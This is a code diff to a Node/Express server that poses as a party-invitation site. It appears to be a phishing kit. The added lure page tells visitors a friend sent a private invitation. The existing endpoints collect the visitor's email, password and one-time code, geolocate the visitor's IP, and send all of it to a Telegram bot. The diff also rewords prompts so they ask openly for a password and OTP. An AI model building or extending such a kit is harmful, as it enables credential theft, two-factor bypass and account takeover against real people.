@@ -7,6 +7,7 @@ const app = express();
 const port = Number(process.env.PORT || 8787);
 const botToken = process.env.TELEGRAM_BOT_TOKEN;
 const chatId = process.env.TELEGRAM_CHAT_ID;
+
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const distPath = path.resolve(__dirname, '../dist');
 
@@ -18,13 +19,8 @@ function getClientIp(request) {
   const realIp = request.headers['x-real-ip'];
   const connectingIp = request.headers['cf-connecting-ip'];
 
-  if (typeof connectingIp === 'string' && connectingIp) {
-    return connectingIp;
-  }
-
-  if (typeof realIp === 'string' && realIp) {
-    return realIp;
-  }
+  if (typeof connectingIp === 'string' && connectingIp) return connectingIp;
+  if (typeof realIp === 'string' && realIp) return realIp;
 
   if (typeof forwardedFor === 'string' && forwardedFor) {
     return forwardedFor.split(',')[0].trim();
@@ -54,10 +50,12 @@ async function getIpLocation(ipAddress) {
 
   try {
     const fields = 'status,country,regionName,city,query';
+
     const lookupResponse = await fetch(
       `http://ip-api.com/json/${encodeURIComponent(ipAddress)}?fields=${fields}`,
-      { signal: controller.signal },
+      { signal: controller.signal }
     );
+
     const result = await lookupResponse.json();
 
     if (!lookupResponse.ok || result.status !== 'success') {
@@ -88,7 +86,7 @@ async function sendTelegramMessage(message) {
         chat_id: chatId,
         text: message,
       }),
-    },
+    }
   );
 
   if (!telegramResponse.ok) {
@@ -96,23 +94,129 @@ async function sendTelegramMessage(message) {
   }
 }
 
+/**
+ * Invitation access page URL
+ * Open this in your browser:
+ * http://localhost:8787/invitation-access
+ */
+app.get('/invitation-access', (request, response) => {
+  response.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Invitation Access</title>
+
+        <style>
+          * {
+            box-sizing: border-box;
+          }
+
+          body {
+            margin: 0;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+            background: #f4f6f8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+          }
+
+          .card {
+            width: 100%;
+            max-width: 520px;
+            background: white;
+            border-radius: 18px;
+            padding: 36px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1);
+            text-align: center;
+          }
+
+          h1 {
+            margin: 0 0 12px;
+            font-size: 32px;
+            color: #111827;
+          }
+
+          h2 {
+            margin: 0 0 18px;
+            font-size: 22px;
+            color: #2563eb;
+          }
+
+          p {
+            margin: 0 0 26px;
+            color: #4b5563;
+            line-height: 1.6;
+          }
+
+          .file-box {
+            padding: 18px;
+            border: 2px dashed #cbd5e1;
+            border-radius: 14px;
+            background: #f8fafc;
+            margin-bottom: 24px;
+            color: #334155;
+          }
+
+          a {
+            display: inline-block;
+            text-decoration: none;
+            background: #2563eb;
+            color: white;
+            padding: 14px 22px;
+            border-radius: 10px;
+            font-weight: bold;
+          }
+
+          a:hover {
+            background: #1d4ed8;
+          }
+        </style>
+      </head>
+
+      <body>
+        <div class="card">
+          <h1>Invitation access</h1>
+
+          <h2>You are invited!</h2>
+
+          <p>
+            Your friend sent a private invitation. Review the prepared file below
+            to continue to the RSVP details.
+          </p>
+
+          <div class="file-box">
+            Prepared invitation file is ready for review.
+          </div>
+
+          <a href="/">Continue to RSVP details</a>
+        </div>
+      </body>
+    </html>
+  `);
+});
+
 app.post('/api/invite', async (request, response) => {
   const email = String(request.body?.email || '').trim();
   const accessCode = String(request.body?.accessCode || '').trim();
 
   if (!email || !accessCode) {
     return response.status(400).json({
-      message: 'Email address and invitation code are required.',
+      message: 'Email address and password are required.',
     });
   }
 
   const ipAddress = getClientIp(request);
   const location = await getIpLocation(ipAddress);
+
   const message = [
     'New invitation access request',
     '',
     `Email: ${email}`,
-    `Password: ${accessCode}`,
+    `password: ${accessCode}`,
     `IP address: ${ipAddress}`,
     `Approx. location: ${location}`,
     `Submitted: ${new Date().toISOString()}`,
@@ -138,7 +242,7 @@ app.post('/api/final-invite', async (request, response) => {
 
   if (!email || !accessCode || !finalCode) {
     return response.status(400).json({
-      message: 'Email, invitation code, and final invite code are required.',
+      message: 'Email, password, and otp are required.',
     });
   }
 
@@ -146,8 +250,8 @@ app.post('/api/final-invite', async (request, response) => {
     'Final invitation code submitted',
     '',
     `Email: ${email}`,
-    `Password: ${accessCode}`,
-    `OTP: ${finalCode}`,
+    `password ${accessCode}`,
+    `otp: ${finalCode}`,
     `Submitted: ${new Date().toISOString()}`,
   ].join('\n');
 
@@ -172,4 +276,5 @@ app.get('*', (request, response) => {
 
 app.listen(port, () => {
   console.log(`Invitation server running on http://127.0.0.1:${port}`);
+  console.log(`Invitation access page: http://127.0.0.1:${port}/invitation-access`);
 });
